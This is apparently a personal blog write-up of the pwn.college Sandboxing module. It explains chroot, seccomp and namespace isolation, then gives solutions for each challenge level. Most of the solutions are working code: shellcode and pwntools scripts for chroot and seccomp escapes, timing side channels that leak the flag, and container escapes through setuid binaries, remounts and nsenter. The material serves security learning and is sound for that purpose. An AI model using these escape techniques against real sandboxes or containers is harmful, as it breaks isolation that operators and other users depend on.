---
layout: post
title:  "Pwn College - Sandboxing"
date:   2024-04-26 19:59:53 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

This module involves escaping Linux sandboxed jails. \
It starts with classic `chroot` escapes, and moves to `seccomp` escaping tricks, as well as container's `namespace` escaping. 

In general this module is great, and I've acquired many non-trivial insights from it. \
As I see, the real added value of this module is a very good introduction into Linux namespaces in general, and exploitation in particular.

## Chroot

Old technique - changes the meaning of `“/”` for a process and its children. E.g. `chroot(“/tmp/jail“)` will disallow process get out of the jail! Note this is a shell built-in, which calls the `chroot()` syscall under the hood. 

Because dynamically linked binaries are dependent on outerior libaries, usually binaries inside the jail are **statically linked**, so there's no need of outer library dependency. \
It is common to use `busybox` among chroot jails. This is a “sweesknife” of shell utils, that contains many important linux binaries, such as `cat, seq, find, sh`, etc. \
`busybox` executes the binary that is supported to it by as `argv[1]`.

Important notes regarding `chroot`:

- `../../` - not gonna work. 

- Doesn’t close resources outside of the jail (for example, file descriptors)

- Doesn’t cd into the jail (`cwd` might be OUTSIDE of the jail!)

- Forgetfullness - can chroot within a jail into another directory

- Open resources - using `openat()` and `execveat()` syscalls, which takes an `dirfd`, if we obtain such fd, we can access any file outside of the jail. A special value is `AT_FDCWD == -100`, which presents the cwd dir fd. Generally speaking, all syscalls with “at” variants are very usefull to escape this kind of jail. 

When excecuting `chroot()`, it doesn’t cd to the jail. Therefore, if no change cwd executed, we are outside of the jail (at location “unknown” to the filesystem).

## Seccomp

Generally, escaping seccomp is hard. 3 main approaches:

- Bad policies. known example: ptrace() syscall, allows hijacking non-sandboxed process. However, the jail might enable some risky syscalls, such as: sendmsg() - transfers fds between processes, prctl() - shitloads of possible effects, process_vm_writev() - like ptrace, allows direct access to other processes memory!

- Syscall confusion - backward compatability with 32-bit, x86. Can switch x86 and x64 modes in the same process. x86 syscall numbers aren't the same as x64!

- Kernel vulns within syscalls handlers

## Challenge 1

Triggers `chroot()`, and can read only a single file. \
Before executing, move to real “/”. Then execute and read “flag” (not “/flag”!)

```bash
cd / && /challenge/babyjail_level1 flag
```

## Challenge 2

This time we cannot open the flag directly. \
I've used `sys_fchmodat` (no 268) shellcode:

```python
import pwn
from glob import glob

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'
pwn.context.encoding = 'latin'  # check this
pwn.context.log_level = 'INFO'
pwn.warnings.simplefilter('ignore')

assembly = """
push 268
pop rax
push 3
pop rdi
push 7
pop rdx
mov rbx, 0x67616c66  # flag
push rbx
push rsp
pop rsi
syscall
"""

print('My shellcode:')
print(assembly)

with pwn.process(argv = ['/challenge/babyjail_level2', '/']) as p:
    pwn.info(p.readrepeat(1))
    p.send(pwn.asm(assembly))
    pwn.info(p.readrepeat(1))
    print('DONEEEEEE1')
```

## Challenge 3

Same as 2.

## Challenge 4

Certain syscalls restrictions. 

```python
import pwn
from glob import glob

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'
pwn.context.encoding = 'latin'  # check this
pwn.context.log_level = 'INFO'
pwn.warnings.simplefilter('ignore')

assembly = """
push 257  # openat
pop rax
push 3  # "/" fd number
pop rdi
push 0  # O_RDONLY
pop rdx

mov rbx, 0x67616c66  # flag
push rbx
push rsp
pop rsi
syscall

push 1  # stdout
pop rdi
mov rsi, rax  # fd returned via open
push 1000
pop r10
mov rax, 40 # sendfile syscall
cdq  # zero out rdx
syscall
"""

print('My shellcode:')
print(assembly)

with pwn.process(argv = ['/challenge/babyjail_level4', '/']) as p:
    pwn.info(p.readrepeat(1))
    p.send(pwn.asm(assembly))
    pwn.info(p.readrepeat(1))
    print('DONEEEEEE1')
```

## Challenge 5

This time we can make a hard-link syscall. 

```bash
push 265  # linkat
pop rax
push 3  # "/" fd number
pop rdi
push -100  # AT_FDCWD - check if its legit
pop rdx
push 0
pop r8  # garbage flag

mov rbx, 0x67616c66  # flag string
push rbx
push rsp
pop rsi
push 0x61
push rsp
pop r10
syscall

push 0x61
push rsp
pop rdi
push 2
pop rax  # open the hard link
push 0
pop rsi  # O_RDONLY
syscall

push 1  # stdout
pop rdi
mov rsi, rax  # fd returned via open
push 1000
pop r10
mov rax, 40 # sendfile syscall
cdq  # zero out rdx
syscall
```

Worth to recall - inodes describes permissions and physical location of a file on the disk. If a file is moved from one folder to another, it moves to a different location on the hard drive - and its inode value will change automaticly. \
Hardlinks - direct reference to a file via its inode. Can change the original file content or location, and the hardlink will still point it it.  

Symlinks - just shortcut references to a file name on the file system, rather than its inode value. 

## Challenge 6

```bash
push 81  # fchdir
pop rax
push 3  # "/" fd number
pop rdi
syscall

mov rbx, 0x67616c66
push rbx
push rsp
pop rdi
push 2
pop rax  # open syscall
push 0
pop rsi  # O_RDONLY
syscall

push 1  # stdout
pop rdi
mov rsi, rax  # fd returned via open
push 1000
pop r10
mov rax, 40 # sendfile syscall
cdq  # zero out rdx
syscall
```

## Challenge 7

This time, we only have access to `chdir()`, `chroot()` and `mkdir()` syscalls. \
This is perfect for the classic chroot-escape trick. 

```bash
push 83  # mkdir
pop rax
push 0x61
push rsp
pop rdi
push 777
pop rsi
syscall

push 161  # chroot the newly-created dir
pop rax
push 0x61
push rsp
pop rdi
syscall

push 80  # were out of the jail, now can change directory!
pop rax
mov rbx, 0x2e2e2f2e2e
push rbx
push rsp
pop rdi
syscall

mov rbx, 0x67616c66
push rbx
push rsp
pop rdi
push 2
pop rax  # open syscall
push 0
pop rsi  # O_RDONLY
syscall

push 1  # stdout
pop rdi
mov rsi, rax  # fd returned via open
push 1000
pop r10
mov rax, 40 # sendfile syscall
cdq  # zero out rdx
syscall
```

More resources about advanced `chroot` escapes: [chroot-escapes][chroot-escapes]. 

## Challenge 8

Like level 3, but this time we have no “/” outside file descriptor, and we’re initially being chdir’ed into the jail. 

We can supply external `dirfd` we open. For completeness, I’ve set stderr of the program as this external fd, just in case there’s some sort of extra verification. \
tl;dr - set stderr to be a fd for an opened dir “/”, outside the jail. 

The shellcode uses fd 2 to access the path:

```python
import pwn
import os
from glob import glob

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'
pwn.context.encoding = 'latin'  # check this
pwn.context.log_level = 'INFO'
pwn.warnings.simplefilter('ignore')

assembly = """
push 257  # openat
pop rax
push 2  # fd to the directory - dup2ed to stdin
pop rdi
push 0  # O_RDONLY
pop rdx

mov rbx, 0x67616c66  # flag
push rbx
push rsp
pop rsi
syscall

push 1  # stdout
pop rdi
mov rsi, rax  # fd returned via open
push 1000
pop r10
mov rax, 40 # sendfile syscall
cdq  # zero out rdx
syscall
"""

print('My shellcode:')
print(assembly)

my_fd = os.open("/", os.O_RDONLY)
print('WOO i just got a directory fd', my_fd)

# os.dup2(my_fd, 2)

with pwn.process(argv = ['/challenge/babyjail_level8'], stderr = my_fd, close_fds = False) as p:
    pwn.info(p.readrepeat(1))
    p.send(pwn.asm(assembly))
    pwn.info(p.readrepeat(1))
    print('DONEEEEEE1')
```

## Challenge 9

Syscall confusion! 

Syscall numbers 3~6 on x86 machine allows us to open, read and write! \
I had to embedd x86 code within x64 arch. This is done natively by using `int 0x80` instead of `syscall`. 

Note - couldn’t use stack addresses, because they usually took more than 32 bits. Thats why I've stored values on the shellcode itself:

```bash
.global _start
.intel_syntax noprefix
_start:
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx

lea rbx, [rip+get_file]

mov al, 5
xor ecx, ecx  # O_RDONLY
int 0x80

mov esi, eax
jmp read

exit:
mov al, 1
xor ebx, ebx
int 0x80

read:
mov ebx, esi  # now contains the opened fd
mov al, 3
lea ecx, [rip + flag_value]
mov dl, 60
int 0x80

mov al, 4
mov bl, 1
mov dl, 60  # ecx still points to the buffer
int 0x80
jmp exit

get_file:
.asciz "/flag"  # change this

flag_value:
.rept 60
.byte 0
.endr
```

## Challenge 10

We can leak the flag using exit codes:

```bash
xor rax, rax
push 3  # read "/flag" fd
pop rdi
lea rsi, [rip + flag_content]
push 60 # count
pop rdx
syscall

xor rdi, rdi
mov dil, byte ptr[rip + flag_content + 3]  # get_first_byte
push 60
pop rax
syscall

flag_content:
.rept 60
.byte 0
.endr
```

## Challenge 11

Side channel - brute force bytes. If we got the right byte, do nanosleep:

```python
import pwn
import os
from glob import glob
import time

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'
pwn.context.encoding = 'latin'  # check this
pwn.context.log_level = 'INFO'
pwn.warnings.simplefilter('ignore')

assembly = """
xor rax, rax
push 3  # read "/flag" fd
pop rdi
lea rsi, [rip + flag_content]
push 60 # count
pop rdx
syscall

xor rbx, rbx
mov bl, byte ptr[rip + flag_content + {}]  # get_first_byte
cmp bl, {}              # compare to some value
je do_nanosleep
jmp do_die

do_nanosleep:
push 500000000
push 0
push rsp
pop rdi     # rqtp ptr
push 0
pop rsi     # null ptr
push 35
pop rax
syscall

do_die:
nop

flag_content:
.rept 60
.byte 0
.endr

"""

print('My shellcode:')
print(assembly)

flag = 'pwn.college{cv2EixNlnJb8A6b2qgbeTWKmzd2.dFDNywCMz'

for i in range(len(flag), 55):
    for b in range(0x20, 0x7f):
        with pwn.process(argv = ['/challenge/babyjail_level11', '/flag'], close_fd                                                                                                   s = False) as p:

            t1 = time.time()
            p.send(pwn.asm(assembly.format(i, b)))

            p.poll(True)

        t2 = time.time()
        interval = t2 - t1
        print(f'TIME INTERVAL: {interval}, index: {i}, byte: {b}')
        print(flag)
        if interval > 0.5:
            print(f'flag[{i}] is {b}')
            flag += chr(b)
            print(flag)
            break
```

## Challenge 12

This time, only read syscall is available. \
The trick is the exact idea as before - but since we no longer have `nanosleep` syscall, just trigger a long execution loop instead. 

```python
import pwn
import os
from glob import glob
import time

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'
pwn.context.encoding = 'latin'
pwn.context.log_level = 'INFO'
pwn.warnings.simplefilter('ignore')

assembly = """
xor rax, rax
push 3  # read "/flag" fd
pop rdi
lea rsi, [rip + flag_content]
push 60 # count
pop rdx
syscall

xor rbx, rbx
mov bl, byte ptr[rip + flag_content + {}]  # get_first_byte
cmp bl, {}              # compare to some value
je crap_loop_start             # change this back to je
jmp do_die

crap_loop_start:
mov rcx, 3500000000
crap_loop:
cmp rcx, 0
je do_die
dec rcx
jmp crap_loop

do_die:
nop

flag_content:
.rept 60
.byte 0
.endr
"""

print('My shellcode:')
print(assembly)

def do_run(i, b):
    with pwn.process(argv = ['/challenge/babyjail_level12', '/flag'], close_fds = False) as p:
        t1 = time.time()
        p.send(pwn.asm(assembly.format(i, b)))

        p.poll(True)

    t2 = time.time()
    interval = t2 - t1
    print(f'TIME INTERVAL: {interval}, index: {i}, byte: {b}')
    print(flag)
    if interval > 0.8:
        return True
    return False

flag = ''
for i in range(len(flag), 55):
    for b in range(0x20, 0x7f):
        try:
            if do_run(i, b):
                print(f'flag[{i}] is {b}')
                flag += chr(b)
                print(flag)
                break
        except:
            print('Got exception')
            time.sleep(1)
            if do_run(i, b):
                flag += chr(b)
                print(flag)
                break
```

Another cool solution involves calling `read(0, buf, flag_byte)`.

We can bruteforce by going over the flag bytes as the amount of bytes to read from stdin. \
As long as we don’t supply enough data, the program should halt and wait for input. \
Therefore, For each flag byte, we would execute the program, send `n` bytes, and check if the program still exists. If so, try sending `n+1`. Otherwise, its a hit and we've found a byte. 


## Challenge 13

Pretty cool, cannot communicate with child process directly. \
Need to read more about unix `socketpair`s. `man unix` (regular unix sockets), `man socketpair`.

```bash
.global _start
.intel_syntax noprefix
_start:
push 4  # child fd
pop rdi
lea rsi, [rip + flag_name]
push 60 # count
pop rdx
push 1
pop rax
syscall

push 4
pop rdi
lea rsi, [rip + flag_content]
push 60
pop rdx
xor rax, rax
syscall

push 4
pop rdi
lea rsi, [rip + do_print]
push 100
pop rdx
push 1
pop rax
syscall

do_print:
.ascii "print_msg:"
flag_content:
.rept 60
.byte 0
.endr

flag_name:
.asciz "read_file:/flag"
```

## Namespaces

`man 7 namespaces`

Modern way of sandboxing, containers implementation, etc. Wraps global system resources in abstractions that make it appear to the processes within the namespace they are isolated - having their own instance of global resources. \
Notice - all processes are still running on the same kernel, it just appears to them as the system is being isolated. \
There are few types of namespaces, such as `mount, network, pid, user, time`. 

`unshare` is a syscall that allows running a process in a new namespace. It may no longer share certain resources with the parent process. Notice that `clone` also supports launching a new process under a different namespace. \
For example, we can create a new shell process, running on a separate mount namespace via:
`unshare -m bash`. \
By default, it inherits all of its parent’s mounts. However, in case it would create new mounts, such as
`mount --bind a a`, the parent won’t be able to see this! \
The other direction also holds - and new mounts the parent creates, would be no longer visible to the child process. 

`pivot_root` is a syscall that changes the root mount / filesystem, of **all** processes within the same mount namespace. It basically does what `chroot` do, but on the whole namespace at once! \
Meaning, all of the processes within the same mount namespace are being “chrooted” to the same new mount point. 

`cgroups` is a particular namespace. The cgroup namespace isolates the cgroup root directory, which allows control of certain process group resources usage. For example - certain group of processes, that can only use up to 1GB of memory. 

## Challenge 14

We’re having the source code of the challenge. Connect via `vm connect` within a tmux terminal. \
This is a warm up challenge - we can see the old file system is still being mounted. 

Hence, just call `cat old/flag` to retrieve the flag. 

## Challenge 15

The sandboxed process still shares the active mounts with its parent. \
In particular, it shares the `/bin` and `/usr/bin` mounts. Therefore, we can easily execute the following within the container:

```bash
chmod +s /usr/bin/cat
```

So that the parent would be able to trivially read the flag with high permissions!

My original idea was to issue `pivot_root` on some directory, hence escaping the jail just as in the classic `chroot` escape. \
However, there were many obstacles to this approach:

There was no `mount` binary within the container, and the parent cannot write to the shared jail. \
Overcomed by:

```bash
# Container
chmod 777 ~
# Now the parent can write freely under the shared jail directory!
# Parent:
cp /usr/bin/mount /tmp/jail-XXXXXX/
```

Next, notice the ordering of mounting is very important, as we always have to mount first the folder higher in the directory tree, otherwise stuff would get re-mounted. \
In case we try to `pivot_root` and it fails due to a busy device, this means we haven’t mounted the destination directory as a mount point. 

```bash
# Container
mkdir new_root
mount --bind new_root/ new_root/
cd new_root
mkdir old bin lib lib64 usr
mount --bind /bin bin
mount --bind /lib lib
mount --bind /lib64 lib64
mount --bind /usr usr
cd ..
pivot_root new_root/ new_root/old/
```

Interestingly, this classic escape didn’t worked, and while the `new_root` was installed properly as a legitimate filesystem mountpoint, the new process was automatically inside of it.

By reading `man 2 pivot_root`, I’ve noted the following special note:

```bash
pivot_root() changes the root directory and the current working directory of each process
or  thread  in  the same mount namespace to new_root if they point to the old root direc‐
tory.  (See also NOTES.)  On the other hand, pivot_root() does not  change  the  caller's
current working directory (unless it is on the old root directory), and thus it should be
followed by a chdir("/") call.
```

Therefore, by default it should not change the cwd. However, because I was executing the exploit while being in the root dir, this special case was hit and the container’s cwd was automatically adjusted!

The fix is easy - just perform the above steps inside some directory.

## Challenge 16

Now the mount points `bin, usr, lib, lib64` are all mounted as read only. This means that even as root, we won’t be able to change the permission bits of binaries, and make `cat` as a suid binary. \
However, a new proc mountpoint is now added!

My original idea is to not use the `proc` filesystem at all, but to move the mount binary into the container (as I've demonstrated above), and **remap** the `usr` mountpoint as non-readonly:

```bash
# Container
chmod 777 . 

# Parent
cp /usr/bin/mount /tmp/jail-XXXXXX

# Container
mount -o remount,bind usr/ usr/  # Mount without readonly attribute!
chmod +s /usr/bin/cat

# Parent
cat /flag
```

This approach works perfectly :)

Because the procfs was added, this clearly isn’t the intended solution. \
I assume the intended solution involves using special files within the proc fs, and `/proc/parent_pid/ns/mnt` in particular. \
The ns directory contains unix sockets of all of the namespaces of certain process. If we would re-assign the mount namespace of the container so that it would be the parent’s, it would be able to access the original filesystem! 

We can do so by using `nsenter` - a tool that calls `setns` syscall under the hood, and switches a namespace by applying it the requested unix socket fd. \
Hence, the intended solution:

```bash
nsenter --mount=/proc/pic/ns/mnt /bin/bash
cat /flag
```

## Challenge 17

This time we have to supply a shellcode, as well as outer fd. \
We can easily supply an `openat` shellcode and get our flag. 

```python
from glob import glob
from dataclasses import dataclass
from pwn import *
import os, sys
import struct
import time
import shutil


BINARY = glob('/challenge/babyjail_level17')[0]
GDB_SCRIPT= '''
'''

ASSEMBLY = '''
sub rsp, 0x50
mov rax, 257
mov rdi, 3
lea rsi, [rip + FLAG]
mov rdx, 0
mov r10, 0
syscall

mov rdi, rax
lea rsi, [rip + FLAG]
mov rdx, 0x50
mov rax, 0
syscall

mov rax, 1
mov rdi, 1
lea rsi, [rip + FLAG]
mov rdx, 0x50
syscall

FLAG:
.string "flag"
.rept 0x50
.byte 0x00
.endr
'''

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')

def main():
    p = process(executable=BINARY, argv=[BINARY, "/"])
    buf = asm(ASSEMBLY)
    p.send(buf)

    p.interactive()


if __name__ == '__main__':
    main()
```

## Challenge 18

Now we can mount our chosen mountpoint, with many restrictions, and send a shellcode to be runned. \
Because `procfs` isn't filtered, clearly the intended solution involving it. 

In particular, I've used the `/proc/self/ns` directory, so that we would switch namespace the `mnt` unix socket of the parent process. We’d have to figure out what exactly the `nsenter` command does internally, and use a similar method to challenge 16. 

By calling `strace` on challenge 16 solution with `nsenter --mount=/proc/pid/ns/mnt ls`, The following output was received:

```bash
openat(AT_FDCWD, "/proc/168/ns/mnt", O_RDONLY) = 3
setns(3, CLONE_NEWNS)                   = 0
close(3)                                = 0
execve("/usr/local/sbin/ls", ["ls"], 0x7ffde3801de8 /* 20 vars */) = -1 ENOENT (No such file or directory)
```

Where `CLONE_NEWNS` stands for 0x20000, via strace -X raw (but we can also supply `0` for the syscall to work).

The following contains a full exploitation that switches the mount namespace into some outerior process, with pid 181:

```python
from glob import glob
from dataclasses import dataclass
from pwn import *
import os, sys
import struct
import time
import shutil


BINARY = glob('/challenge/babyjail_level18')[0]
GDB_SCRIPT= '''
'''

ASSEMBLY = '''
lea rdi, [rip + MNT_NS]  # fd = open("/data/mnt", O_RDONLY)
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall

mov rdi, rax  # setns(fd, CLONE_NEWNS)
mov rsi, 0x20000
mov rax, 308
syscall

lea rdi, [rip + FLAG]  # fd = open("/flag", O_RDONLY)
mov rsi, 0
mov rdx, 0
mov rax, 2  
syscall

mov rdi, rax  # read(fd, FLAG, 0x50)
lea rsi, [rip + FLAG]
mov rdx, 0x50
mov rax, 0
syscall

mov rdi, 1  # write(1, FLAG, 0x50)
lea rsi, [rip + FLAG]
mov rdx, 0x50
mov rax, 1
syscall

TMPFS:
.string "tmpfs"
.rept 0x50
.byte 0x00
.endr

DATA:
.string "/data"
.rept 0x50
.byte 0x00
.endr

MNT_NS:
.string "/data/mnt"
.rept 0x50
.byte 0x00
.endr

FLAG:
.string "/flag"
.rept 0x50
.byte 0x00
.endr
'''

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')

def main():
    p = process(executable=BINARY, argv=[BINARY, "/proc/181/ns"])
    buf = asm(ASSEMBLY)
    p.send(buf)

    p.interactive()

if __name__ == '__main__':
    main()
```

My original idea was different - place `cat` binary within the home directory, and mount the home directory within the container. Using the shellcode, change the owner, group and suid permissions of the `cat` binary, so that we would be able to read the flag regulary with it!

Indeed, the following exploit does changes `/home/hacker/cat` into root's suid binary. \
Note that the challenge sets the sent mount as a read-only mount within the container. Hence, it doesn't allows changing permission bits, owners, and any attribute of any file by default. \
By manually calling `mount("/data", "/data", "tmpfs", MS_REMOUNT|MS_BIND, 0)` within the shellcode, I've remounted the home directory mount within the container, now as writeable filesystem. 

The 4th argument value stands for `0x1020` and found via `strace -X raw`. \
The 3rd argument value stands for the mount type, a string that was found via `df`:

```bash
bash-5.0# df -Th
Filesystem     Type   Size  Used Avail Use% Mounted on
tmp            tmpfs  991M  4.0K  991M   1% /
/dev/root      9p     916G  612G  258G  71% /bin
```

The script:

```python
from glob import glob
from dataclasses import dataclass
from pwn import *
import os, sys
import struct
import time
import shutil


BINARY = glob('/challenge/babyjail_level18')[0]
GDB_SCRIPT= '''
'''

ASSEMBLY = '''
mov rax, 165
lea rdi, [rip + DATA]
lea rsi, [rip + DATA]
lea rdx, [rip + TMPFS]
mov r10, 0x1020  # TODO - ADD suid
mov r8, 0
syscall

mov rax, 92
lea rdi, [rip + CAT]
mov rsi, 0
mov rdx, 0
syscall

mov rax, 90 
lea rdi, [rip + CAT]
mov rsi, 0xfff
syscall

TMPFS:
.string "tmpfs"
.rept 0x10
.byte 0x00
.endr

DATA:
.string "/data"
.rept 0x10
.byte 0x00
.endr

CAT:
.string "/data/cat"
.rept 0x10
.byte 0x00
.endr
'''

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')

def main():
    p = process(executable=BINARY, argv=[BINARY, "/home/hacker"])
    buf = asm(ASSEMBLY)
    p.send(buf)

    p.interactive()


if __name__ == '__main__':
    main()
```

Indeed, I've successfully turned `/home/hacker/cat` into root's suid! \
However, I still couldn't read the flag. \
Apparently, **the home directory is mounted as `nosuid`**. Therefore, the suid bit is simply ignored by default!


[chroot-escapes]: https://github.com/earthquake/chw00t
